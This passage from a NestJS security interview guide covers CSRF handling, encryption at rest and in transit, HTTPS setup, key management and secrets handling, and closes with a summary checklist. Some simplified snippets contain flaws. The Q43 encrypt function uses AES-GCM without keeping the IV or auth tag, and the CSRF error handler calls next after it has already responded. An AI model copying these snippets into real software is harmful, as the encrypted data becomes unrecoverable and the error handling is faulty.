fetch('/submit', {
  method: 'POST',
  headers: {
    'Content-Type': 'application/json',
    'X-CSRF-Token': csrfToken, // Include in header
  },
  body: JSON.stringify({ name: 'John' }),
});

// 6. Error Handling
app.use((err, req, res, next) => {
  if (err.code === 'EBADCSRFTOKEN') {
    res.status(403).json({ message: 'Invalid CSRF token' });
  }
  next(err);
});
```

**Interview Tip**: Install csurf + cookie-parser, configure middleware, use `req.csrfToken()` to generate. Include token in `_csrf` field (forms) or `X-CSRF-Token` header (AJAX). Auto-validates.

</details>

## Data Encryption

43. What is encryption at rest vs encryption in transit?

<details>
<summary><strong>Answer</strong></summary>

**Encryption at Rest**: Protects **stored data** (database, files, backups) from physical/unauthorized access. **Encryption in Transit**: Protects **data moving** over networks (HTTPS, TLS) from interception. **Both Essential**: Complete protection requires both layers. **At Rest**: Database-level or disk encryption. **In Transit**: HTTPS/SSL/TLS. **Production**: Always encrypt passwords, PII, payment data.

```typescript
// Encryption at Rest vs In Transit

// 1. ENCRYPTION AT REST (Database)
import * as crypto from 'crypto';

@Entity()
export class User {
  @Column()
  name: string;
  
  @Column({ type: 'text' })
  encryptedSSN: string; // Stored encrypted
  
  // Encrypt before saving
  @BeforeInsert()
  @BeforeUpdate()
  encryptSensitiveData() {
    if (this.ssn) {
      this.encryptedSSN = encrypt(this.ssn);
    }
  }
}

function encrypt(text: string): string {
  const cipher = crypto.createCipheriv('aes-256-gcm', key, iv);
  return cipher.update(text, 'utf8', 'hex') + cipher.final('hex');
}

// Database stores encrypted: "8f3a9c2b1d..." instead of "123-45-6789"

// 2. ENCRYPTION IN TRANSIT (HTTPS)
// main.ts
import * as https from 'https';
import * as fs from 'fs';

const httpsOptions = {
  key: fs.readFileSync('./secrets/private-key.pem'),
  cert: fs.readFileSync('./secrets/certificate.pem'),
};

const app = await NestFactory.create(AppModule, {
  httpsOptions, // ✅ Enables HTTPS
});

await app.listen(443);

// Client → Server communication encrypted with TLS
// Prevents man-in-the-middle attacks
```

**Interview Tip**: At Rest = stored data (database encryption), In Transit = network data (HTTPS/TLS). Both required for complete protection. Encrypt PII, passwords, payment data at rest. Always use HTTPS in production.

</details>

44. How do you use HTTPS/SSL in production?

<details>
<summary><strong>Answer</strong></summary>

**HTTPS/SSL**: Encrypts data in transit using **TLS certificates**. **Setup**: Obtain SSL certificate (Let's Encrypt free), configure NestJS with cert files, redirect HTTP→HTTPS. **Production**: Use reverse proxy (Nginx) or cloud load balancer for SSL termination. **Best Practices**: HSTS header, renew certs automatically, strong ciphers. **Essential**: Never send passwords/tokens over HTTP.

```typescript
// HTTPS/SSL Setup

// 1. NestJS with HTTPS
import * as https from 'https';
import * as fs from 'fs';

async function bootstrap() {
  const httpsOptions = {
    key: fs.readFileSync('./secrets/privkey.pem'),
    cert: fs.readFileSync('./secrets/fullchain.pem'),
  };
  
  const app = await NestFactory.create(AppModule, {
    httpsOptions, // ✅ Enables HTTPS
  });
  
  // Redirect HTTP to HTTPS
  app.use((req, res, next) => {
    if (!req.secure) {
      return res.redirect(`https://${req.headers.host}${req.url}`);
    }
    next();
  });
  
  await app.listen(443);
}

// 2. Production: Nginx Reverse Proxy (Recommended)
// nginx.conf
server {
  listen 443 ssl http2;
  server_name example.com;
  
  ssl_certificate /etc/letsencrypt/live/example.com/fullchain.pem;
  ssl_certificate_key /etc/letsencrypt/live/example.com/privkey.pem;
  
  ssl_protocols TLSv1.2 TLSv1.3;
  ssl_ciphers HIGH:!aNULL:!MD5;
  
  location / {
    proxy_pass http://localhost:3000; // NestJS app
    proxy_set_header X-Forwarded-Proto $scheme;
  }
}

// Redirect HTTP → HTTPS
server {
  listen 80;
  server_name example.com;
  return 301 https://$server_name$request_uri;
}

// 3. Get Free Certificate (Let's Encrypt)
// sudo certbot --nginx -d example.com
// Auto-renew: certbot renew --dry-run

// 4. Helmet HSTS
app.use(helmet.hsts({
  maxAge: 31536000, // 1 year
  includeSubDomains: true,
  preload: true,
}));
```

**Interview Tip**: Obtain SSL cert (Let's Encrypt), configure NestJS with cert files. Production: use Nginx/load balancer for SSL termination. Set HSTS header, redirect HTTP→HTTPS. Essential for security.

</details>

45. Should you encrypt sensitive data in the database?

<details>
<summary><strong>Answer</strong></summary>

**Yes**: Encrypt **sensitive fields** (SSN, credit cards, health data, passwords). **Method**: Field-level encryption with AES-256. **Key Management**: Store keys in secrets manager, not codebase. **Libraries**: `crypto` (Node.js), `typeorm-encrypted`. **Trade-offs**: Performance overhead, complex queries. **Best Practice**: Encrypt PII, hash passwords (bcrypt), encrypt at rest. **Production**: Required for compliance (GDPR, HIPAA, PCI-DSS).

```typescript
// Database Field Encryption

// 1. Manual Encryption with Crypto
import * as crypto from 'crypto';

const ENCRYPTION_KEY = process.env.ENCRYPTION_KEY; // 32 bytes
const IV_LENGTH = 16;

@Entity()
export class User {
  @Column()
  name: string;
  
  @Column({ type: 'text' })
  encryptedSSN: string;
  
  // Virtual property (not stored)
  ssn: string;
  
  @BeforeInsert()
  @BeforeUpdate()
  encryptData() {
    if (this.ssn) {
      const iv = crypto.randomBytes(IV_LENGTH);
      const cipher = crypto.createCipheriv('aes-256-gcm', Buffer.from(ENCRYPTION_KEY, 'hex'), iv);
      
      let encrypted = cipher.update(this.ssn, 'utf8', 'hex');
      encrypted += cipher.final('hex');
      const authTag = cipher.getAuthTag();
      
      // Store: iv:authTag:encrypted
      this.encryptedSSN = `${iv.toString('hex')}:${authTag.toString('hex')}:${encrypted}`;
    }
  }
  
  @AfterLoad()
  decryptData() {
    if (this.encryptedSSN) {
      const [ivHex, authTagHex, encrypted] = this.encryptedSSN.split(':');
      
      const decipher = crypto.createDecipheriv(
        'aes-256-gcm',
        Buffer.from(ENCRYPTION_KEY, 'hex'),
        Buffer.from(ivHex, 'hex')
      );
      
      decipher.setAuthTag(Buffer.from(authTagHex, 'hex'));
      
      let decrypted = decipher.update(encrypted, 'hex', 'utf8');
      decrypted += decipher.final('utf8');
      
      this.ssn = decrypted;
    }
  }
}

// 2. typeorm-encrypted (Easier)
// npm install typeorm-encrypted

import { EncryptionTransformer } from 'typeorm-encrypted';

const transformer = new EncryptionTransformer({
  key: process.env.ENCRYPTION_KEY,
  algorithm: 'aes-256-gcm',
  ivLength: 16,
});

@Entity()
export class User {
  @Column({
    type: 'text',
    transformer: transformer, // Auto encrypt/decrypt
  })
  ssn: string;
}
```

**Interview Tip**: Yes, encrypt PII (SSN, credit cards). Use AES-256 with crypto module. Store encryption keys in secrets manager. Hash passwords with bcrypt (not encryption). Required for compliance.

</details>

46. How do you handle encryption keys?

<details>
<summary><strong>Answer</strong></summary>

**Key Management**: **Never hardcode** keys. **Storage**: Use secrets manager (AWS Secrets Manager, HashiCorp Vault, Azure Key Vault). **Rotation**: Change keys periodically, re-encrypt data. **Access**: Limit who can access keys (IAM policies). **Environment**: Load at runtime from secure source. **Backup**: Store keys securely, disaster recovery plan. **Production**: Essential for security compliance.

```typescript
// Encryption Key Management

// ❌ NEVER DO THIS:
const ENCRYPTION_KEY = '1234567890abcdef...'; // Hardcoded!

// ✅ 1. Environment Variables (Better)
// .env
ENCRYPTION_KEY=generated_secure_32_byte_key_here

// config.service.ts
@Injectable()
export class ConfigService {
  get encryptionKey(): string {
    const key = process.env.ENCRYPTION_KEY;
    if (!key) {
      throw new Error('ENCRYPTION_KEY not set');
    }
    return key;
  }
}

// ✅ 2. AWS Secrets Manager (Best)
// npm install @aws-sdk/client-secrets-manager

import { SecretsManagerClient, GetSecretValueCommand } from '@aws-sdk/client-secrets-manager';

@Injectable()
export class SecretsService {
  private client = new SecretsManagerClient({ region: 'us-east-1' });
  private cache = new Map<string, { value: string; expires: number }>();
  
  async getEncryptionKey(): Promise<string> {
    // Check cache (avoid API calls)
    const cached = this.cache.get('encryption-key');
    if (cached && cached.expires > Date.now()) {
      return cached.value;
    }
    
    // Fetch from AWS
    const command = new GetSecretValueCommand({
      SecretId: 'prod/encryption-key',
    });
    
    const response = await this.client.send(command);
    const key = response.SecretString;
    
    // Cache for 5 minutes
    this.cache.set('encryption-key', {
      value: key,
      expires: Date.now() + 5 * 60 * 1000,
    });
    
    return key;
  }
}

// ✅ 3. HashiCorp Vault
import * as vault from 'node-vault';

@Injectable()
export class VaultService {
  private client = vault({
    apiVersion: 'v1',
    endpoint: process.env.VAULT_ADDR,
    token: process.env.VAULT_TOKEN,
  });
  
  async getSecret(path: string): Promise<string> {
    const result = await this.client.read(path);
    return result.data.value;
  }
}

// 4. Key Rotation Strategy
@Injectable()
export class KeyRotationService {
  async rotateKey() {
    const newKey = crypto.randomBytes(32).toString('hex');
    
    // 1. Store new key
    await this.secretsService.storeKey('encryption-key-v2', newKey);
    
    // 2. Re-encrypt all sensitive data
    const users = await this.userRepository.find();
    for (const user of users) {
      const decrypted = decryptWithOldKey(user.encryptedSSN);
      user.encryptedSSN = encryptWithNewKey(decrypted);
      await this.userRepository.save(user);
    }
    
    // 3. Update active key
    await this.secretsService.setActiveKey('encryption-key-v2');
  }
}
```

**Interview Tip**: Never hardcode keys. Use AWS Secrets Manager/Vault. Load at runtime, cache briefly. Rotate keys periodically, re-encrypt data. Limit access with IAM. Essential for production security.

</details>

## Environment Variables & Secrets

47. How do you securely manage environment variables?

<details>
<summary><strong>Answer</strong></summary>

**Environment Variables**: Store configuration/secrets **outside code**. **Security**: Use `.env` files locally, secrets manager in production. **Never Commit**: Add `.env` to `.gitignore`. **Access**: Use `@nestjs/config` module. **Validation**: Validate required vars at startup. **Production**: Use platform secrets (AWS Parameter Store, Kubernetes Secrets). **Principle**: 12-factor app methodology.

```typescript
// Secure Environment Variables

// 1. Setup @nestjs/config
// npm install @nestjs/config
// npm install joi (for validation)

// .env (Local Development)
DATABASE_URL=postgresql://localhost:5432/mydb
JWT_SECRET=super_secret_key_change_in_production
AWS_ACCESS_KEY=AKIAIOSFODNN7EXAMPLE

// ❌ NEVER commit .env files!
// .gitignore
.env
.env.local
.env.production

// 2. Configuration Module
import { ConfigModule } from '@nestjs/config';
import * as Joi from 'joi';

@Module({
  imports: [
    ConfigModule.forRoot({
      isGlobal: true,
      validationSchema: Joi.object({
        NODE_ENV: Joi.string().valid('development', 'production').required(),
        DATABASE_URL: Joi.string().required(),
        JWT_SECRET: Joi.string().min(32).required(),
        AWS_ACCESS_KEY: Joi.string().required(),
      }),
    }),
  ],
})
export class AppModule {}

// 3. Type-Safe Config Service
export interface AppConfig {
  database: {
    url: string;
  };
  jwt: {
    secret: string;
    expiresIn: string;
  };
}

@Injectable()
export class AppConfigService {
  constructor(private configService: ConfigService) {}
  
  get database() {
    return {
      url: this.configService.get<string>('DATABASE_URL'),
    };
  }
  
  get jwt() {
    return {
      secret: this.configService.get<string>('JWT_SECRET'),
      expiresIn: this.configService.get<string>('JWT_EXPIRES_IN', '1h'),
    };
  }
}

// 4. Production: AWS Systems Manager Parameter Store
import { SSMClient, GetParameterCommand } from '@aws-sdk/client-ssm';

@Injectable()
export class AwsConfigService {
  private client = new SSMClient({ region: 'us-east-1' });
  
  async getParameter(name: string): Promise<string> {
    const command = new GetParameterCommand({
      Name: `/prod/app/${name}`,
      WithDecryption: true,
    });
    
    const response = await this.client.send(command);
    return response.Parameter.Value;
  }
}

// 5. Kubernetes Secrets (Production)
// kubectl create secret generic app-secrets \
//   --from-literal=jwt-secret=xyz123 \
//   --from-literal=db-password=abc456

// deployment.yaml
env:
  - name: JWT_SECRET
    valueFrom:
      secretKeyRef:
        name: app-secrets
        key: jwt-secret
```

**Interview Tip**: Use `.env` locally, secrets manager in production. Never commit `.env`. Validate with joi at startup. Use @nestjs/config. Production: AWS Parameter Store, Kubernetes Secrets.

</details>

48. Should you commit `.env` files to version control?

<details>
<summary><strong>Answer</strong></summary>

**Never Commit .env**: Contains **secrets** (API keys, passwords, tokens). **Risk**: Exposed on GitHub, anyone can access. **Best Practice**: `.env` in `.gitignore`, commit `.env.example` with dummy values. **Team Sharing**: Use secrets manager, share securely (1Password, LastPass). **Production**: Use platform secrets, not .env files. **GitHub**: Scan for exposed secrets, rotate immediately if leaked.

```typescript
// .env File Management

// ❌ NEVER DO THIS:
// git add .env
// git commit -m "Add environment variables" 
// git push
// → SECRETS EXPOSED ON GITHUB!

// ✅ CORRECT APPROACH:

// 1. Add to .gitignore
// .gitignore
.env
.env.local
.env.*.local
.env.production

// 2. Create .env.example (Safe to commit)
// .env.example
DATABASE_URL=postgresql://localhost:5432/mydb
JWT_SECRET=change_me_in_production
AWS_ACCESS_KEY=your_aws_key_here
STRIPE_SECRET_KEY=sk_test_...

# Instructions:
# 1. Copy this file to .env
# 2. Replace values with real credentials
# 3. Never commit .env file

// 3. Team Onboarding (README.md)
## Setup
1. Clone repository
2. Copy `.env.example` to `.env`
3. Ask team lead for real credentials
4. Update `.env` with provided values

// 4. Pre-commit Hook (Prevent accidents)
// .husky/pre-commit
#!/bin/sh
if git diff --cached --name-only | grep -q "^\.env$"; then
  echo "❌ Error: .env file cannot be committed!"
  echo "Add .env to .gitignore"
  exit 1
fi

// 5. GitHub Secret Scanning
// If accidentally committed:
// 1. Remove from history:
git filter-branch --force --index-filter \
  "git rm --cached --ignore-unmatch .env" \
  --prune-empty --tag-name-filter cat -- --all

// 2. Rotate ALL secrets immediately
// 3. Force push:
git push origin --force --all

// 6. Production: Use Secrets Manager
// No .env files in production!
// AWS Secrets Manager, Vault, Azure Key Vault
```

**Interview Tip**: Never commit .env - contains secrets. Add to .gitignore, commit .env.example with dummy values. Share secrets via secrets manager. If leaked, rotate immediately. Production: use platform secrets.

</details>

49. How do you use secret management tools (AWS Secrets Manager, HashiCorp Vault)?

<details>
<summary><strong>Answer</strong></summary>

**Secret Management Tools**: **Centralized** secret storage with access control, rotation, auditing. **AWS Secrets Manager**: Store/retrieve secrets via API, automatic rotation. **HashiCorp Vault**: Open-source, dynamic secrets, encryption as service. **Benefits**: No secrets in code, audit logs, access control (IAM). **NestJS**: Fetch secrets at startup, cache briefly. **Production**: Essential for compliance, security.

```typescript
// Secret Management Tools

// 1. AWS Secrets Manager
// npm install @aws-sdk/client-secrets-manager

import { SecretsManagerClient, GetSecretValueCommand } from '@aws-sdk/client-secrets-manager';

@Injectable()
export class AwsSecretsService implements OnModuleInit {
  private client = new SecretsManagerClient({ region: 'us-east-1' });
  private secrets = new Map<string, any>();
  
  async onModuleInit() {
    // Load secrets at startup
    await this.loadSecrets();
  }
  
  private async loadSecrets() {
    try {
      // Fetch database credentials
      const dbSecret = await this.getSecret('prod/database');
      this.secrets.set('database', JSON.parse(dbSecret));
      
      // Fetch JWT secret
      const jwtSecret = await this.getSecret('prod/jwt-secret');
      this.secrets.set('jwt', jwtSecret);
      
      // Fetch API keys
      const apiKeys = await this.getSecret('prod/api-keys');
      this.secrets.set('apiKeys', JSON.parse(apiKeys));
    } catch (error) {
      console.error('Failed to load secrets:', error);
      process.exit(1); // Fail fast
    }
  }
  
  private async getSecret(secretName: string): Promise<string> {
    const command = new GetSecretValueCommand({ SecretId: secretName });
    const response = await this.client.send(command);
    return response.SecretString;
  }
  
  get database() {
    return this.secrets.get('database');
  }
  
  get jwtSecret(): string {
    return this.secrets.get('jwt');
  }
}

// Usage:
@Injectable()
export class AuthService {
  constructor(private secretsService: AwsSecretsService) {}
  
  generateToken(user: User) {
    return jwt.sign({ id: user.id }, this.secretsService.jwtSecret);
  }
}

// 2. HashiCorp Vault
// npm install node-vault

import * as vault from 'node-vault';

@Injectable()
export class VaultService implements OnModuleInit {
  private client: any;
  private secrets = new Map<string, any>();
  
  async onModuleInit() {
    this.client = vault({
      apiVersion: 'v1',
      endpoint: process.env.VAULT_ADDR,
      token: process.env.VAULT_TOKEN,
    });
    
    await this.loadSecrets();
  }
  
  private async loadSecrets() {
    // Read KV secrets
    const dbCreds = await this.client.read('secret/data/database');
    this.secrets.set('database', dbCreds.data.data);
    
    // Dynamic database credentials (auto-rotate)
    const dynamicDb = await this.client.read('database/creds/readonly');
    this.secrets.set('dbUser', dynamicDb.data);
    
    // Encryption as a service
    const encrypted = await this.client.write('transit/encrypt/my-key', {
      plaintext: Buffer.from('sensitive data').toString('base64'),
    });
    this.secrets.set('encrypted', encrypted.data.ciphertext);
  }
  
  async encrypt(plaintext: string): Promise<string> {
    const response = await this.client.write('transit/encrypt/my-key', {
      plaintext: Buffer.from(plaintext).toString('base64'),
    });
    return response.data.ciphertext;
  }
  
  async decrypt(ciphertext: string): Promise<string> {
    const response = await this.client.write('transit/decrypt/my-key', {
      ciphertext,
    });
    return Buffer.from(response.data.plaintext, 'base64').toString();
  }
}

// 3. Azure Key Vault
// npm install @azure/keyvault-secrets @azure/identity

import { SecretClient } from '@azure/keyvault-secrets';
import { DefaultAzureCredential } from '@azure/identity';

@Injectable()
export class AzureSecretsService {
  private client: SecretClient;
  
  constructor() {
    const vaultUrl = `https://${process.env.KEY_VAULT_NAME}.vault.azure.net`;
    const credential = new DefaultAzureCredential();
    this.client = new SecretClient(vaultUrl, credential);
  }
  
  async getSecret(name: string): Promise<string> {
    const secret = await this.client.getSecret(name);
    return secret.value;
  }
}
```

**Interview Tip**: Centralized secret storage with access control. AWS Secrets Manager: API-based, auto-rotation. Vault: open-source, dynamic secrets. Fetch at startup, cache briefly. No secrets in code/repos.

</details>

50. What is the principle of keeping secrets out of code?

<details>
<summary><strong>Answer</strong></summary>

**Principle**: **Never hardcode secrets** in source code. **Reasons**: Code in version control → exposed on GitHub, leaked in logs, visible to all developers. **Best Practice**: Environment variables, secrets managers, config files (gitignored). **Scope**: API keys, passwords, tokens, encryption keys, certificates. **Benefits**: Easy rotation, access control, audit logs, compliance. **Production**: Essential security requirement.

```typescript
// Keeping Secrets Out of Code

// ❌ BAD: Secrets in Code
@Injectable()
export class BadService {
  // ❌ Hardcoded credentials
  private dbPassword = 'super_secret_password';
  private apiKey = 'sk_live_abc123xyz';
  private jwtSecret = '1234567890abcdef';
  
  // Risks:
  // 1. Visible in GitHub
  // 2. Leaked in logs
  // 3. All developers have access
  // 4. Can't rotate without code change
  // 5. Accidental exposure (console.log, errors)
}

// ✅ GOOD: Secrets from Environment
@Injectable()
export class GoodService {
  constructor(
    private configService: ConfigService,
    private secretsService: SecretsService,
  ) {}
  
  async init() {
    // ✅ From environment variables
    const dbPassword = this.configService.get('DB_PASSWORD');
    
    // ✅ From secrets manager
    const apiKey = await this.secretsService.getSecret('stripe-api-key');
    
    // ✅ From AWS Secrets Manager
    const jwtSecret = await this.secretsService.getSecret('jwt-secret');
  }
}

// Best Practices:

// 1. Environment Variables
// .env (gitignored)
DATABASE_PASSWORD=xyz123
STRIPE_API_KEY=sk_live_...

// config.service.ts
@Injectable()
export class ConfigService {
  get databasePassword(): string {
    return process.env.DATABASE_PASSWORD;
  }
}

// 2. Secrets Manager (Production)
@Injectable()
export class SecretsService {
  async getApiKey(): Promise<string> {
    return await awsSecretsManager.getSecret('api-key');
  }
}

// 3. Configuration Files (Gitignored)
// config/secrets.json (gitignored)
{
  "database": {
    "password": "xyz123"
  }
}

// 4. Kubernetes Secrets
// Mounted as environment variables or files

// 5. Never Log Secrets
logger.log(`User ${user.id} logged in`); // ✅ Safe
logger.log(`Token: ${token}`); // ❌ Dangerous!

// 6. Sanitize Error Messages
try {
  await connectDatabase(password);
} catch (error) {
  // ❌ Bad: Exposes password
  throw new Error(`Failed to connect: ${error.message}`);
  
  // ✅ Good: Generic message
  throw new Error('Failed to connect to database');
}

// 7. Code Reviews
// Check for:
// - Hardcoded passwords
// - API keys in code
// - Committed .env files
// - Secrets in logs
// - Exposed in error messages
```

**Interview Tip**: Never hardcode secrets - use environment variables or secrets managers. Prevents GitHub exposure, enables rotation, access control. Essential: API keys, passwords, tokens out of code.

</details>

---

## Summary

This comprehensive guide covered **50 critical security questions** for NestJS applications:

1. **Security Fundamentals** (Q1-Q4): OWASP Top 10, API security, least privilege, authentication
2. **Password Security** (Q5-Q8): Bcrypt hashing, algorithm comparison, JWT storage, token storage
3. **Cookie Security** (Q9-Q12): HTTPOnly, Secure flag, SameSite attribute, CORS basics
4. **CORS Configuration** (Q13-Q16): Enabling CORS, configuration options, security risks, Helmet middleware
5. **Security Headers** (Q17-Q20): Helmet usage, security headers, CSP, HSTS
6. **Rate Limiting** (Q21-Q24): Rate limiting importance, @nestjs/throttler, brute force prevention, per-user/IP limiting
7. **Input Validation** (Q25-Q30): ValidationPipe, class-validator, sanitization, whitelist, forbidNonWhitelisted
8. **SQL Injection** (Q31-Q34): SQL injection basics, TypeORM prevention, ORM vs raw queries, parameterization
9. **XSS Prevention** (Q35-Q38): XSS attacks, prevention strategies, output escaping, HTML sanitization
10. **CSRF Prevention** (Q39-Q42): CSRF attacks, prevention methods, token pattern, csurf middleware
11. **Data Encryption** (Q43-Q46): Encryption types, HTTPS/SSL, database encryption, key management
12. **Secrets Management** (Q47-Q50): Environment variables, .env security, secrets manager tools, keeping secrets out of code

### Key Security Principles:
- **Defense in Depth**: Multiple security layers
- **Least Privilege**: Minimum necessary permissions
- **Never Trust User Input**: Always validate and sanitize
- **Secure by Default**: Security-first configuration
- **Zero Trust**: Verify everything, assume breach
- **Fail Securely**: Handle errors without exposing information

### Production Security Checklist:
✅ Helmet middleware with CSP and HSTS  
✅ Rate limiting on all endpoints  
✅ Input validation with whitelist=true  
✅ Parameterized queries (no raw SQL)  
✅ HTTPOnly, Secure, SameSite cookies  
✅ CSRF protection for state-changing operations  
✅ HTTPS/TLS in production  
✅ Secrets in AWS Secrets Manager/Vault  
✅ Password hashing with bcrypt (12+ rounds)  
✅ Regular security audits and updates
